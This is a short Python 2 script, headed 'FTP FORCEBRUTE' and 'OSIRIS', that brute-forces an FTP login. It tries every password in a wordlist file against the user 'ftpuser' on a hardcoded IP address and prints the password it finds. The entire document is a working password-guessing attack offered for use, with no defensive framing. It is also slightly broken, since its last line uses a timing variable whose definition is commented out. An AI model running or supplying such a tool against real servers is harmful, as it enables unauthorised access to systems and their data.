### 	FTP FORCEBRUTE 	###
### 	OSIRIS 			###
import ftplib, sys
import time
from progressbar import *

def ftpbreaker(addr, user, passwd, i):
	try:
		con = ftplib.FTP(addr)
		con.login(user, passwd)
		con.close()
		return 1

	except Exception, error:
		return 0

	except KeyboardInterrupt:
		sys.exit()
addr ="91.134.135.18"
port ="21"
widgets = ['[>] Brute: ', Percentage(), ' ', Bar(marker='#',left='[',right=']')]
user = "ftpuser"
passwdsPath ="passwds.txt"
passwdLines = len(open(passwdsPath).readlines())
print "[>] Trying passwords for user: "+user
bar = ProgressBar(widgets=widgets, maxval=passwdLines)
passwdsFile = open(passwdsPath, 'r')
bar.start()
c=0
#t1 = datetime.now()
for passwd in passwdsFile:
	con = ftpbreaker(addr, user, passwd, c)
	c+=1
	bar.update(c)
	if con == 1:
		break
bar.finish()
#t2 = datetime.now()
#t = t2-t1
print "[!] Password found :) > "+passwd
print "[?] The brute force took: "+t
